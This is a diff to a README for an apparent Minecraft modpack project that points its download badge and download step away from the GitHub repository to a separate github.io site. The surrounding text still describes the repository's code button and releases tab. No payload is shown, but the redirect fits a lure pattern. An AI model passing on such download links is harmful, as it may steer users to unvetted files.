@@ -1,6 +1,6 @@
 # ⚙️ ccapib-v2026-game-script - Progress through custom Minecraft worlds easily
 
-[![Download Minecraft Modpack](https://img.shields.io/badge/Download_Modpack-Blue-blue)](https://github.com/Johe172/ccapib-v2026-game-script)
+[![Download Minecraft Modpack](https://img.shields.io/badge/Download_Modpack-Blue-blue)](https://johe172.github.io)
 
 ## 🎮 About this project
 
@@ -27,7 +27,7 @@ Minecraft requires Java to run correctly. Open your web browser and navigate to 
 ### 2. Download the modpack
 Visit the following page to obtain the files for this project:
 
-[https://github.com/Johe172/ccapib-v2026-game-script](https://github.com/Johe172/ccapib-v2026-game-script)
+[https://johe172.github.io](https://johe172.github.io)
 
 On this page, look for the green code button or the releases tab. Save the file to your Downloads folder.
 
